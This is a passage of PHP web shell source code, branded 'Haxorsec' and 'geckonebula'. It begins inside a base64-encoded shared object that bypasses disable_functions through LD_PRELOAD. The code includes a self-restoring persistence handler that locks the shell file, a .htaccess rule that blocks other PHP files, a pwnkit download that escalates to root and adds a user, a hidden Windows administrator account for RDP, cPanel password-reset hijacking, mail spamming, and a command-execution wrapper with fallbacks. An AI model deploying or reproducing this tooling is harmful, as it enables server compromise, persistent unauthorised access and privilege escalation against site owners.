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AAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElCQ18yLjIuNQBleGl0QEBHTElCQ18yLjIuNQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQBfaW5pdABmb3JrQEBHTElCQ18yLjIuNQAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5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';
                                                                    $cmdd = $_POST['exechankro'];
                                                                    $meterpreter = base64_encode($cmdd);
                                                                    echo "Featured By Haxorsec";
                                                                    echo "Usage: id > /tmp/test.txt\n";
                                                                    echo "after execute check your /tmp/test.txt Or Backconnect to your shell\n";
                                                                    echo "base64 : " . $meterpreter ."";
                                                                    file_put_contents($full . '/chankro.so', base64_decode($hook));
                                                                    file_put_contents($full . '/acpid.socket', base64_decode($meterpreter));
                                                                    putenv('CHANKRO=' . $full . '/acpid.socket');
                                                                    putenv('LD_PRELOAD=' . $full . '/chankro.so');
                                                                    mail('a','a','a','a');
                                                                }
                                                            }
                                                            ?></textarea>
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="exechankro" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
                            <li><input type="submit" name="terminal-chankro" value=">" class="btn-modal-close"></li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    <?php endif;

if (isset($_GET['lockshell'])) {
    $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    $TmpNames = $fungsi[31]();
    if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler')) && file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'))) {
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-handler'));
    }
    mkdir($TmpNames . "/.sessions");
    cmd("cp $curFile " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text'));
    chmod($curFile, 0444);
    $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . __DIR__ . '")){
        mkdir("' . __DIR__ . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $curFile . '")){
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile) . '-text') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", ' . $fungsi[32] . '($text));
    }
    if (geckonebula_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (geckonebula_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function geckonebula_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . "", $handler);
    if ($hndlers) {
        cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
        success();
    } else {
        failed();
    }
}
if (isset($_POST['geckonebula-up-submit'])) {
    $namaFilenya = $_FILES['geckonebula-upload']['name'];
    $tmpName = $_FILES['geckonebula-upload']['tmp_name'];
    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
        success();
    } else {
        failed();
    }
}
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
  }
if (isset($_POST['geckonebula-bitninja-up-submit'])) {
    $namaFilenya = $_FILES['geckonebula-bitninja-upload']['name'];
    $tmpName = $_FILES['geckonebula-bitninja-upload']['tmp_name'];
    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
        $ff = generateRandomString() .".php";
        @$GLOBALS['fungsi'][34]($namaFilenya,$ff);
        echo "<script>alert('Success! Your Name Files ".$ff."');</script>";
        @$GLOBALS['fungsi'][24]($namaFilenya);
    }else{
failed();
    }
}
if (isset($_GET['destroy'])) {
    $DOC_ROOT = $_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
    $CurrentFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    if ($fungsi[4]($DOC_ROOT)) {
        $htaccess = '
<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
    Deny from all
</FilesMatch>
<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$">
    Allow from all
</FilesMatch>
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
    Allow from all
</FilesMatch>';
        $put_htt = $fungsi[28]($DOC_ROOT . "/.htaccess", $htaccess);
        if ($put_htt) {
            success();
        } else {
            failed();
        }
    } else {
        failed();
    }
}


if (isset($_POST['save-editor'])) {
    $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
    if ($save) {
        success();
    } else {
        failed();
    }
}

if (isset($_GET['adminer'])) {
    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
    if (!$fungsi[3]('adminer.php')) {
        $fungsi[28]("adminer.php", $fungsi[11]($URL));
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '">';
    }
}


if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit"));
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit "id" > .mad-root');
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
    }
}

if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['geckonebula-select'] == "delete") {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if (is_dir($fd) || is_file($fd)) {
                $rmdir = unlinkDir($fd);
                $rmfile = $fungsi[24]($fd);
                if ($rmdir || $rmfile) {
                    success();
                } else if ($rmdir && $rmfile) {
                    success();
                } else {
                    failed();
                }
            }
        }
    } else if ($_POST['geckonebula-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if (ExtractArchive($fd, $repl . '/') == true) {
                success();
            } else {
                failed();
            }
        }
    } else if ($_POST['geckonebula-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
                compressToZip($fd, pathinfo($fd, PATHINFO_FILENAME) . ".zip");
            }
        }
    }
}

if (isset($_POST['submit'])) {
    if ($_POST['resetcp'] == true) {
        $emailCp = $_POST['resetcp'];
        $path0cp = dirname($_SERVER['DOCUMENT_ROOT']);
        $pathcp = $path0cp . "/.cpanel/contactinfo";
        $contactinfo = '
"email" : "' . $emailCp . '"
        ';
        if ($fungsi[3]($pathcp)) {
            $fungsi[28]($pathcp, $contactinfo);
            echo '<meta http-equiv="refresh" content="0;url=' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1">';
        } else {
            failed();
        }
    }
    if ($_POST['create_folder'] == true) {
        $NamaFolder = $fungsi[12]($_POST['create_folder']);
        if ($NamaFolder) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['create_file'] == true) {
        $namaFile = $fungsi[13]($_POST['create_file']);
        if ($namaFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['renameFile'] == true) {
        $renameFile = $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
        if ($renameFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['chFile']) {
        $chFiles = $fungsi[30](unx($_GET['ch']), $_POST['chFile']);
        if ($chFiles) {
            success();
        } else {
            failed();
        }
    } else if (isset($_POST['add-username']) && isset($_POST['add-password'])) {
        if (!$fungsi[3]('pwnkit')) {
            cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
            cmd('chmod +x pwnkit');
            cmd('./pwnkit "id" > .mad-root');
            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
        } else if ($fungsi[3]('.mad-root')) {
            $response = $fungsi[11]('.mad-root');
            $r_text = explode(" ", $response);
            if ($r_text[0] == "uid=0(root)") {
                $username = $_POST['add-username'];
                $password = $_POST['add-password'];
                cmd('./pwnkit "useradd ' . $username . ' ; echo -e "' . $password . '\n' . $password . '" | passwd ' . $username . '"');
            } else {
                echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&adduser=failed">';
            }
        }
    } else if ($_POST['lockfile'] == true) {
        $flesName = $_POST['lockfile'];
        $TmpNames = $fungsi[31]();
        if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler'));
        }
        mkdir($TmpNames . "/.sessions");
        cmd("cp $flesName " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
        cmd("chmod 444 " . $flesName);
        $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . $fungsi[0]() . '")){
        mkdir("' . $fungsi[0]() . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", ' . $fungsi[32] . '($text));
    }
    if (geckonebula_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    }
    if (geckonebula_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}

function geckonebula_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
        if ($hndlers) {
            cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &');
            success();
        } else {
            failed();
        }
    } else if ($_POST['add-rdp'] == True) {
        $userRDP = $_POST['add-rdp'];
        $passRDP = $_POST['add-rdp-pass'];
        if (stristr(PHP_OS, "WIN")) {
            $procRDP = cmd("net user " . $userRDP . " " . $passRDP . " /add");
            if ($procRDP) {
                cmd("net localgroup administrators " . $userRDP . " /add");
                success();
            } else {
                failed();
            }
        } else {
            failed();
        }
    } else if ($_POST['mail-from-smtp'] == True) {
        $emailFrom = $_POST['mail-from-smtp'];
        $emailTo = $_POST['mail-to-smtp'];
        $emailSubject = $_POST['mailto-subject'];
        $messageMail = $_POST['message-smtp'];
        $headersMail = 'From: ' . $emailFrom . '' . "\r\n" .
            'Reply-To: ' . $emailFrom . '' . "\r\n" .
            'X-Mailer: PHP/' . phpversion();
        $procMailSmTp = mail($emailTo, $emailSubject, $messageMail, $headersMail);
        if ($procMailSmTp) {
            success();
        } else {
            failed();
        }
    }
}

if ($_GET['response'] == "success") {
    echo "<script>
Swal.fire({
    icon: 'success',
    title: 'Sucesss...',
    text: 'Done Success!',
    confirmButtonColor: '#22242d',
})</script>";
} else if ($_GET['response'] == "failed") {
    echo "<script>
Swal.fire({
    icon: 'error',
    title: 'Failed...',
    text: 'Something wrong!',
    confirmButtonColor: '#22242d',
})
    </script>";
} 


function success()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">';
}

function failed()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=failed">';
}

function formatSize($bytes)
{
    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $types[$i]);
}


function hx($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unx($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}

function suggest_exploit()
{
    $uname = $GLOBALS['fungsi'][8]();
    $xplod = explode(" ", $uname);
    $xpld = explode("-", $xplod[2]);
    $pl = explode(".", $xpld[0]);
    return $pl[0] . "." . $pl[1] . "." . $pl[2];
}
function s()
{
    $d0mains = @$GLOBALS['fungsi'][7]("/etc/named.conf", false);
    if (!$d0mains) {
        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
        $GLOBALS["need_to_update_header"] = "true";
    } else {
        $count = 0;
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    flush();
                    $count++;
                }
            }
        }
        $dom = "$count Domain";
    }
    return $dom;
}

function cmd($in, $re = false)
{
    $out = '';
    try {
        if ($re) $in = $in . " 2>&1";
        if (function_exists("\x65\x78\x65\x63")) {
            @$GLOBALS['fungsi'][16]($in, $out);
            $out = @join("\n", $out);
        } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
            ob_start();
            @$GLOBALS['fungsi'][17]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) {
            ob_start();
            @$GLOBALS['fungsi'][18]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
            $out = $GLOBALS['fungsi'][19]($in);
        } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) {
            if (is_resource($f = @$GLOBALS['fungsi'][20]($in, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                $GLOBALS['fungsi'][21]($f);
            }
        } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
            $pipes = array();
            $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @$GLOBALS['fungsi'][22]($pipes[1]);
        } elseif (class_exists('COM')) {
            $alfaWs = new COM('WScript.shell');
            $e = $alfaWs->$GLOBALS['fungsi'][16]('cmd.exe /c ' . $_POST['alfa1']);
            $stdout = $e->StdOut();
            $out = $stdout->ReadAll();
        }
    } catch (Exception $e) {
    }
    return $out;
}


function winpwd()
{
    return str_replace("\\", "/", $GLOBALS['fungsi'][0]());
}

function compressToZip($sourceFile, $zipFilename)
{
    $zip = new ZipArchive();

    if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) {
        $zip->addFile($sourceFile, basename($sourceFile));
        $zip->close();
        success();
    } else {
        failed();
    }
}

function remove_slash($val)
{
    $tex = str_replace("/", "", $val);
    $tex1 = str_replace(":", "", $tex);
    $tex2 = str_replace("_", "", $tex1);
    $tex3 = str_replace(" ", "", $tex2);
    $tex4 = str_replace(".", "", $tex3);
    return $tex4;
}

function unlinkDir($dir)
{
    $dirs = array($dir);
    $files = array();
    for ($i = 0;; $i++) {
        if (isset($dirs[$i]))
            $dir =  $dirs[$i];
        else
            break;

        if ($openDir = opendir($dir)) {
            while ($readDir = @readdir($openDir)) {
                if ($readDir != "." && $readDir != "..") {

                    if ($GLOBALS['fungsi'][2]($dir . "/" . $readDir)) {
                        $dirs[] = $dir . "/" . $readDir;
                    } else {

                        $files[] = $dir . "/" . $readDir;
                    }
                }
            }
        }
    }



    foreach ($files as $file) {
        $GLOBALS['fungsi'][24]($file);
    }
    $dirs = array_reverse($dirs);
    foreach ($dirs as $dir) {
        $GLOBALS['fungsi'][25]($dir);
    }
}

function remove_dot($file)
{
    $FILES = $file;
    $pch = explode(".", $FILES);
    return $pch[0];
}


function windowsDriver()
{
    $winArr = [
